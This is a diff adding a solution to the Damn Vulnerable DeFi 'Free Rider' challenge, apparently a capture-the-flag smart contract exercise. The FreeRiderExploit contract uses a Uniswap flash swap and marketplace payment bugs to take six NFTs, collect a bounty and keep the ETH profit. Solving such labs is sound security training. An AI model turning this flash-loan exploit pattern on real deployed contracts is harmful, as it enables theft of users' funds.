@@ -123,7 +123,16 @@ contract FreeRiderChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_freeRider() public checkSolvedByPlayer {
-        
+        FreeRiderExploit exploit = new FreeRiderExploit(
+            address(uniswapPair),
+            address(weth),
+            address(marketplace),
+            address(nft),
+            address(recoveryManager),
+            payable(player)
+        );
+
+        exploit.attack();
     }
 
     /**
@@ -144,5 +153,73 @@ contract FreeRiderChallenge is Test {
         // Player must have earned all ETH
         assertGt(player.balance, BOUNTY);
         assertEq(address(recoveryManager).balance, 0);
+    }
+}
+
+contract FreeRiderExploit {
+    IUniswapV2Pair private immutable pair;
+    WETH private immutable weth;
+    FreeRiderNFTMarketplace private immutable marketplace;
+    DamnValuableNFT private immutable nft;
+    address private immutable recoveryManager;
+    address payable private immutable player;
+
+    uint256 private constant PRICE = 15e18;
+    uint256 private constant AMOUNT = 6;
+
+    constructor(
+        address _pair,
+        address _weth,
+        address _marketplace,
+        address _nft,
+        address _recoveryManager,
+        address payable _player
+    ) {
+        pair = IUniswapV2Pair(_pair);
+        weth = WETH(payable(_weth));
+        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
+        nft = DamnValuableNFT(_nft);
+        recoveryManager = _recoveryManager;
+        player = _player;
+    }
+
+    receive() external payable {}
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+
+    function attack() public {
+        pair.swap(PRICE, 0, address(this), abi.encode(PRICE));
+    }
+
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
+        require(msg.sender == address(pair), "not pair");
+
+        // unwrap borrowed WETH -> ETH
+        weth.withdraw(amount0);
+
+        uint256[] memory ids = new uint256[](AMOUNT);
+        for (uint256 i = 0; i < AMOUNT; i++) {
+            ids[i] = i;
+        }
+
+        // exploit marketplace bugs
+        marketplace.buyMany{value: PRICE}(ids);
+
+        // send NFTs to recovery manager, triggering bounty payout
+        for (uint256 i = 0; i < AMOUNT; i++) {
+            nft.safeTransferFrom(address(this), recoveryManager, i, abi.encode(player));
+        }
+
+        // repay flash swap
+        uint256 fee = ((amount0 * 3) / 997) + 1;
+        uint256 amountToRepay = amount0 + fee;
+
+        weth.deposit{value: amountToRepay}();
+        weth.transfer(address(pair), amountToRepay);
+
+        // send remaining ETH profit to player
+        player.transfer(address(this).balance);
     }
 }
